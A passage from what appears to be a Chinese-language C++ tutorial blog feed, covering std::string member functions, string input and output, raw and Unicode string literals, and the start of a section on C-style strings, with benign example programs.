返回字符串中的字符数（两者功能相同）。</li></ul></li><li><strong>检查是否为空:</strong><ul><li>  <code>empty()</code>: 如果字符串为空，返回 <code>true</code>，否则返回 <code>false</code>。</li></ul></li><li><strong>访问字符:</strong><ul><li>  <code>[]</code> 运算符: 像数组一样通过索引访问字符（不进行边界检查）。</li><li>  <code>at()</code>: 通过索引访问字符（进行边界检查，如果越界会抛出 <code>std::out_of_range</code> 异常）。</li></ul></li><li><strong>查找:</strong><ul><li>  <code>find()</code>: 查找子字符串或字符首次出现的位置，返回索引；如果未找到，返回 <code>std::string::npos</code> (一个特殊的静态成员常量)。</li><li>  <code>rfind()</code>: 从后向前查找。</li><li>  <code>find_first_of()</code>, <code>find_last_of()</code>, <code>find_first_not_of()</code>, <code>find_last_not_of()</code>: 查找字符集中的任意字符或非任意字符。</li></ul></li><li><strong>子字符串:</strong><ul><li>  <code>substr(pos, count)</code>: 返回从位置 <code>pos</code> 开始，长度为 <code>count</code> 的子字符串。</li></ul></li><li><strong>比较:</strong><ul><li>  <code>compare()</code>: 比较字符串（字典序），返回负数、零或正数。</li><li>  重载的关系运算符 (<code>==</code>, <code>!=</code>, <code>&lt;</code>, <code>&gt;</code>, <code>&lt;=</code>, <code>&gt;=</code>): 可以直接比较 <code>string</code> 对象。</li></ul></li><li><strong>修改:</strong><ul><li>  <code>insert()</code>: 在指定位置插入字符或字符串。</li><li>  <code>erase()</code>: 删除指定位置和数量的字符。</li><li>  <code>replace()</code>: 替换指定范围的字符。</li><li>  <code>clear()</code>: 清空字符串。</li><li>  <code>append()</code>: 等同于 <code>+=</code>。</li></ul></li></ul><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdexcept&gt; // 为了 std::out_of_range</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> text = <span class="string">&quot;Hello C++ World!&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 长度和空检查</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Text: \&quot;&quot;</span> &lt;&lt; text &lt;&lt; <span class="string">&quot;\&quot;&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Length: &quot;</span> &lt;&lt; text.length() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 16</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Is empty? &quot;</span> &lt;&lt; <span class="built_in">std</span>::boolalpha &lt;&lt; text.empty() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 false</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 访问字符</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;First char (operator[]): &quot;</span> &lt;&lt; text[<span class="number">0</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;   <span class="comment">// 输出 H</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Fifth char (at()): &quot;</span> &lt;&lt; text.at(<span class="number">4</span>) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;     <span class="comment">// 输出 o</span></span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; text.at(20); // 会抛出 std::out_of_range 异常</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 查找</span></span><br><span class="line">    <span class="keyword">size_t</span> pos_cpp = text.find(<span class="string">&quot;C++&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (pos_cpp != <span class="built_in">std</span>::<span class="built_in">string</span>::npos) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\&quot;C++\&quot; found at index: &quot;</span> &lt;&lt; pos_cpp &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 6</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\&quot;C++\&quot; not found.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">size_t</span> pos_l = text.find(<span class="string">&#x27;l&#x27;</span>); <span class="comment">// 查找第一个 &#x27;l&#x27;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;First &#x27;l&#x27; found at index: &quot;</span> &lt;&lt; pos_l &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 2</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> pos_last_l = text.rfind(<span class="string">&#x27;l&#x27;</span>); <span class="comment">// 查找最后一个 &#x27;l&#x27;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Last &#x27;l&#x27; found at index: &quot;</span> &lt;&lt; pos_last_l &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 12</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 子字符串</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> sub = text.substr(<span class="number">6</span>, <span class="number">3</span>); <span class="comment">// 从索引 6 开始，取 3 个字符</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Substring (6, 3): \&quot;&quot;</span> &lt;&lt; sub &lt;&lt; <span class="string">&quot;\&quot;&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 &quot;C++&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 比较</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> s1 = <span class="string">&quot;apple&quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> s2 = <span class="string">&quot;apply&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (s1 &lt; s2) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\&quot;&quot;</span> &lt;&lt; s1 &lt;&lt; <span class="string">&quot;\&quot; comes before \&quot;&quot;</span> &lt;&lt; s2 &lt;&lt; <span class="string">&quot;\&quot;&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> cmp_result = s1.compare(s2); <span class="comment">// 返回负数，因为 &quot;apple&quot; &lt; &quot;apply&quot;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Compare result: &quot;</span> &lt;&lt; cmp_result &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// 修改</span></span><br><span class="line">    text.insert(<span class="number">10</span>, <span class="string">&quot; beautiful&quot;</span>); <span class="comment">// 在索引 10 处插入</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After insert: \&quot;&quot;</span> &lt;&lt; text &lt;&lt; <span class="string">&quot;\&quot;&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 &quot;Hello C++ beautiful World!&quot;</span></span><br><span class="line"></span><br><span class="line">    text.erase(<span class="number">6</span>, <span class="number">4</span>); <span class="comment">// 从索引 6 开始，删除 4 个字符 (&quot;C++ &quot;)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After erase: \&quot;&quot;</span> &lt;&lt; text &lt;&lt; <span class="string">&quot;\&quot;&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 &quot;Hello beautiful World!&quot;</span></span><br><span class="line"></span><br><span class="line">    text.replace(<span class="number">6</span>, <span class="number">9</span>, <span class="string">&quot;gorgeous&quot;</span>); <span class="comment">// 从索引 6 开始，替换 9 个字符 (&quot;beautiful&quot;)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After replace: \&quot;&quot;</span> &lt;&lt; text &lt;&lt; <span class="string">&quot;\&quot;&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 &quot;Hello gorgeous World!&quot;</span></span><br><span class="line"></span><br><span class="line">    text.clear(); <span class="comment">// 清空字符串</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After clear, is empty? &quot;</span> &lt;&lt; <span class="built_in">std</span>::boolalpha &lt;&lt; text.empty() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 true</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4-3-4-string类I-O"><a href="#4-3-4-string类I-O" class="headerlink" title="4.3.4 string类I/O"></a>4.3.4 string类I/O</h2><p>可以使用标准的输入输出流对象 <code>cin</code> 和 <code>cout</code> 来方便地读写 <code>string</code> 对象。</p><ul><li>  <strong>输出 (<code>cout &lt;&lt;</code>):</strong> <code>&lt;&lt;</code> 运算符被重载，可以直接将 <code>string</code> 对象输出到 <code>cout</code>。</li><li>  <strong>输入 (<code>cin &gt;&gt;</code>):</strong> <code>&gt;&gt;</code> 运算符被重载，可以从 <code>cin</code> 读取<strong>一个单词</strong>（以空白符——空格、制表符、换行符分隔）到 <code>string</code> 对象中。它会自动跳过开头的空白符，然后在遇到下一个空白符时停止读取。</li><li><strong>读取整行 (<code>getline()</code>):</strong> 如果需要读取包含空格的整行文本，应该使用 <code>getline()</code> 函数（这是一个全局函数，不是 <code>string</code> 的成员函数）。<ul><li>  <code>getline(cin, str)</code>: 从 <code>cin</code> 读取一行（直到遇到换行符 <code>\n</code>），并将内容（不包括换行符）存储到 <code>string</code> 对象 <code>str</code> 中。</li><li>  <code>getline(cin, str, delimiter)</code>: 读取直到遇到指定的 <code>delimiter</code> 字符为止。</li></ul></li></ul><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> word1, word2;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> line;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 输出</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> message = <span class="string">&quot;Enter two words:&quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; message &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 输入 (cin &gt;&gt; 读取单词)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; word1 &gt;&gt; word2; <span class="comment">// 输入 &quot;Hello World&quot; (用空格隔开)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Word 1: &quot;</span> &lt;&lt; word1 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 Hello</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Word 2: &quot;</span> &lt;&lt; word2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 World</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 清除输入缓冲区中可能残留的换行符 (cin &gt;&gt; 之后通常需要)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span>.ignore(<span class="number">10000</span>, <span class="string">&#x27;\n&#x27;</span>); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// 输入 (getline 读取整行)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter a line of text: &quot;</span>;</span><br><span class="line">    getline(<span class="built_in">std</span>::<span class="built_in">cin</span>, line); <span class="comment">// 输入 &quot;This is a test line.&quot;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;You entered: \&quot;&quot;</span> &lt;&lt; line &lt;&lt; <span class="string">&quot;\&quot;&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 &quot;This is a test line.&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注意:</strong> 在混合使用 <code>cin &gt;&gt;</code> 和 <code>getline(cin, ...)</code> 时要特别小心。<code>cin &gt;&gt;</code> 读取单词后，会将换行符留在输入缓冲区中。如果紧接着调用 <code>getline()</code>，它会立即读到这个换行符并认为读取结束，导致得到一个空字符串。通常需要在 <code>cin &gt;&gt;</code> 之后、<code>getline()</code> 之前清除缓冲区中的换行符，例如使用 <code>std::cin.ignore()</code>。</p><h2 id="4-3-5-其他形式的字符串字面值"><a href="#4-3-5-其他形式的字符串字面值" class="headerlink" title="4.3.5 其他形式的字符串字面值"></a>4.3.5 其他形式的字符串字面值</h2><p>C++11 引入了新的字符串字面值形式，提供了对不同字符编码（如 Unicode）的更好支持。</p><ol><li><p><strong>原始字符串字面值 (Raw String Literal):</strong></p><ul><li>  语法: <code>R&quot;delimiter(raw_characters)delimiter&quot;</code></li><li>  <code>delimiter</code> 是一个可选的、最多16个字符的序列（不能包含空格、括号、反斜杠）。</li><li>  <code>raw_characters</code> 是字符串内容，其中的反斜杠 <code>\</code> 和引号 <code>&quot;</code> 等特殊字符不会被转义，按原样解释。</li><li>  主要用于书写包含大量特殊字符的字符串，如正则表达式、文件路径、HTML/XML代码等，避免大量的反斜杠转义。</li><li>  示例: <code>R&quot;(C:\Program Files\)&quot;</code>, <code>R&quot;delimiter(String with &quot;quotes&quot; and \backslashes)delimiter&quot;</code></li></ul></li><li><p><strong>Unicode 字符串字面值:</strong></p><ul><li>  <code>u8&quot;string&quot;</code>: UTF-8 编码的字符串 (类型是 <code>const char[]</code>，但应存储在 <code>std::string</code> 或处理 UTF-8 的地方)。</li><li>  <code>u&quot;string&quot;</code>: UTF-16 编码的字符串 (类型是 <code>const char16_t[]</code>)。</li><li>  <code>U&quot;string&quot;</code>: UTF-32 编码的字符串 (类型是 <code>const char32_t[]</code>)。</li></ul></li></ol><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 原始字符串字面值</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> path1 = <span class="string">&quot;C:\\Program Files\\My App\\&quot;</span>; <span class="comment">// 需要转义反斜杠</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> path2 = <span class="string">R&quot;(C:\Program Files\My App\)&quot;</span>; <span class="comment">// 使用原始字符串，无需转义</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> regex = <span class="string">R&quot;(\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]&#123;2,&#125;\b)&quot;</span>; <span class="comment">// 正则表达式</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> html = <span class="string">R&quot;delimiter(</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">  &lt;head&gt;&lt;title&gt;Raw String&lt;/title&gt;&lt;/head&gt;</span></span><br><span class="line"><span class="string">  &lt;body&gt;&lt;p&gt;&quot;Hello!&quot;&lt;/p&gt;&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;)delimiter&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Path 1: &quot;</span> &lt;&lt; path1 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Path 2: &quot;</span> &lt;&lt; path2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Regex: &quot;</span> &lt;&lt; regex &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;HTML:\n&quot;</span> &lt;&lt; html &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Unicode 字符串字面值 (主要用于需要特定编码的场景)</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* utf8_str = <span class="string">u8&quot;你好，世界&quot;</span>; <span class="comment">// UTF-8 (需要支持 UTF-8 的环境/终端才能正确显示)</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char16_t</span>* utf16_str = <span class="string">u&quot;你好，世界&quot;</span>; <span class="comment">// UTF-16</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char32_t</span>* utf32_str = <span class="string">U&quot;你好，世界&quot;</span>; <span class="comment">// UTF-32</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;UTF-8 String (may not display correctly): &quot;</span> &lt;&lt; utf8_str &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 处理和打印 UTF-16/32 通常需要专门的库或函数</span></span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; utf16_str; // 不能直接用 cout 打印 char16_t* / char32_t*</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>原始字符串字面值在处理包含特殊字符的文本时非常方便。Unicode 字符串字面值则为处理国际化文本提供了标准化的基础。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>4.2 字符串</title>
      <link href="2025/04/26/4.2_%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
      <url>2025/04/26/4.2_%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
      
        <content type="html"><![CDATA[<p>字符串是程序中用于表示文本信息的重要数据类型。C++处理字符串有两种主要方式：</p><ol><li> <strong>C风格字符串 (C-Style String):</strong> 这是继承自C语言的方式，将字符串视为存储在 <code>char</code> 数组中并以<strong>空字符 (<code>\0</code>)</strong> 结尾的字符序列。</li><li> <strong><code>string</code> 类:</strong> C++标准库提供了一个强大的 <code>string</code> 类，提供了更方便、更安全的字符串操作（将在 4.3 节介绍）。</li></ol><p>本节主要关注 C 风格字符串。</p><p><strong>字符串字面值 (String Literal) 或字符串常量 (String Constant):</strong><br>在代码中用双引号 <code>&quot;&quot;</code> 括起来的字符序列，例如 <code>&quot;Hello, world!&quot;</code>, <code>&quot;C++&quot;</code>, <code>&quot;&quot;</code> (空字符串)。它们存储在内存的只读区域。编译器会自动在字符串字面值的末尾添加空字符 <code>\0</code>。</p><h2 id="4-2-1-拼接字符串常量"><a href="#4-2-1-拼接字符串常量" class="headerlink" title="4.2.1 拼接字符串常量"></a>4.2.1 拼接字符串常量</h2><p>C++允许将<strong>相邻</strong>的字符串字面值自动拼接（连接）成一个单独的字符串。这对于将较长的字符串分成多行书写非常有用，可以提高代码的可读性。</p><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 相邻的字符串字面值会被自动拼接</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;This is the first part, &quot;</span> <span class="string">&quot;and this is the second part.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">// 输出: This is the first part, and this is the second part.</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 可以跨越多行</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Line 1: Some text...\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;Line 2: More text...\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;Line 3: Final line.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    输出:</span></span><br><span class="line"><span class="comment">    Line 1: Some text...</span></span><br><span class="line"><span class="comment">    Line 2: More text...</span></span><br><span class="line"><span class="comment">    Line 3: Final line.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 拼接结果是一个单独的字符串常量</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* long_message = <span class="string">&quot;Part 1. &quot;</span></span><br><span class="line">                               <span class="string">&quot;Part 2. &quot;</span></span><br><span class="line">                               <span class="string">&quot;Part 3.&quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; long_message &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; </span><br><span class="line">    <span class="comment">// 输出: Part 1. Part 2. Part 3.</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 注意：变量和字符串字面值不能自动拼接</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> part1 = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; part1 &quot; world!&quot;; // 错误! 不能这样拼接变量和字面值</span></span><br><span class="line">    <span class="comment">// 需要使用 string 类的拼接操作 (见 4.3 节) 或 cout 的链式输出</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; part1 &lt;&lt; <span class="string">&quot; world!&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 正确</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4-2-2-在数组中使用字符串"><a href="#4-2-2-在数组中使用字符串" class="headerlink" title="4.2.2 在数组中使用字符串"></a>4.2.2 在数组中使用字符串</h2><p>C风格字符串本质上是 <code>char</code> 类型的数组，其特殊之处在于最后一个字符必须是**空字符 (<code>\0</code>)**。这个空字符标记了字符串的实际结束位置。</p><p><strong>声明和初始化:</strong></p><p>可以使用字符串字面值来初始化 <code>char</code> 数组。编译器会自动计算大小（包括末尾的 <code>\0</code>）并将其复制到数组中。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt; // 包含 C 风格字符串函数库 (例如 strlen)</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 使用字符串字面值初始化 char 数组</span></span><br><span class="line">    <span class="keyword">char</span> dog[<span class="number">8</span>] = <span class="string">&quot;fatcat&quot;</span>; <span class="comment">// 数组大小必须足够容纳字符串 + 空字符 